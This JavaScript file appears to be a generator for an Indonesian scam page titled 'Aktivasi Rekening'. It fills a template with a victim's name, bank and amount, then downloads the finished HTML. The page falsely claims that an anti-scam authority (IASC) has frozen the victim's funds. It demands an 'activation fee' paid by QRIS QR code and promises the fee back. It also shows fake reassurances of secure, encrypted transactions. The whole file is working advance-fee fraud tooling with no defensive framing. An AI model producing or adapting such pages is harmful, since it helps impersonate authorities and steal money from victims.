async function iascLoadActivasiCss() {
    try {
        var res = await fetch("activasi.css");
        if (res.ok) return await res.text();
    } catch (e) {}
    try {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "activasi.css", false);
        xhr.send(null);
        if (xhr.status === 0 || xhr.status === 200) return xhr.responseText;
    } catch (e) {}
    return "";
}

function iascBuildActivasiHtml(payload, cssText) {
    var qrSrc = payload.qrImage || "QR.png";
    var dataJson = JSON.stringify(payload);
    var styleBlock = cssText
        ? "<style>\n" + cssText + "\n</style>"
        : '<link rel="stylesheet" href="activasi.css">';
    var sc = "script";

    var parts = [];
    parts.push("<!DOCTYPE html>");
    parts.push('<html lang="id">');
    parts.push("<head>");
    parts.push('<meta charset="UTF-8" />');
    parts.push('<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>');
    parts.push("<title>Aktivasi Rekening</title>");
    parts.push('<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">');
    parts.push(styleBlock);
    parts.push("</head>");
    parts.push("<body>");
    parts.push('<div class="container">');
    parts.push('<div class="top-shape"></div>');
    parts.push('<div class="shield"><img src="https://cdn-icons-png.flaticon.com/512/190/190411.png"></div>');
    parts.push('<div class="title">AKTIVASI REKENING</div>');
    parts.push('<div class="info-box"><div class="info-icon">i</div><div class="info-text">');
    parts.push("Silahkan aktivasi rekening penerima jika benar anda pemilik rekening tersebut untuk menerima kembali saldo yang telah di bekukan oleh pihak IASC A/n ");
    parts.push('<b id="act-nama">-</b> - <b id="act-bank">-</b> sebesar <b id="act-saldo-masuk">-</b>');
    parts.push("</div></div>");
    parts.push('<div class="scan-title"><span>SCAN QR UNTUK AKTIVASI</span></div>');
    parts.push('<div class="qr-box"><img id="act-qr" src="' + qrSrc + '" alt="QR aktivasi pembayaran">');
    parts.push('<p id="act-qr-hint" class="qr-hint" hidden>QR QRIS</p></div>');
    parts.push('<div class="detail-box">');
    parts.push('<div class="row"><div class="left"><div class="circle">Rp</div>Nominal Aktivasi</div><div class="right blue" id="act-nominal-aktivasi">-</div></div>');
    parts.push('<div class="row"><div class="left"><div class="circle">#</div>Metode Aktivasi</div><div class="right">QRIS / Scan QR</div></div>');
    parts.push('<div class="row"><div class="left"><div class="circle">P</div>Penerima</div><div class="right bold" id="act-penerima-nama">-</div></div>');
    parts.push("</div>");
    parts.push('<div class="warning"><div class="warning-icon">!</div><p>');
    parts.push("Note : Biaya aktivasi tetap akan kembali bersama saldo yang telah di bekukan untuk di terima kembali ke rekening anda.<br><br>");
    parts.push("<b>Pastikan nominal sesuai sebelum melakukan pembayaran.</b></p></div>");
    parts.push('<div class="footer">Transaksi aman dan terenkripsi</div>');
    parts.push("</div>");

    var fillJs =
        "window.__ACTIVASI_DATA__=" + dataJson + ";" +
        "(function(){function setText(id,t){var el=document.getElementById(id);if(el&&t)el.textContent=t;}" +
        "function fill(d){if(!d)return;" +
        'if(d.totalFormatted)setText("act-saldo-masuk","Rp"+d.totalFormatted+",-");' +
        'if(d.receiverBank)setText("act-bank",d.receiverBank);' +
        'if(d.receiverName){setText("act-nama",d.receiverName);setText("act-penerima-nama",d.receiverName);}' +
        'if(d.feeFormatted)setText("act-nominal-aktivasi","Rp"+d.feeFormatted+",-");' +
        'var q=document.getElementById("act-qr");if(d.qrImage&&q)q.src=d.qrImage;}' +
        "fill(window.__ACTIVASI_DATA__);})();";

    parts.push("<" + sc + ">" + fillJs + "</" + sc + ">");
    parts.push("</body>");
    parts.push("</html>");

    return parts.join("\n");
}

async function iascDownloadActivasiHtml(payload) {
    var cssText = await iascLoadActivasiCss();
    var html = iascBuildActivasiHtml(payload, cssText);
    var blob = new Blob([html], { type: "text/html;charset=utf-8" });
    var url = URL.createObjectURL(blob);
    var a = document.createElement("a");
    var safeName = payload.receiverName.replace(/[^\w\s-]/g, "").trim().replace(/\s+/g, "-").slice(0, 40) || "data";
    a.href = url;
    a.download = "activasi-" + safeName + ".html";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    alert("File activasi-" + safeName + ".html berhasil diunduh.");
}
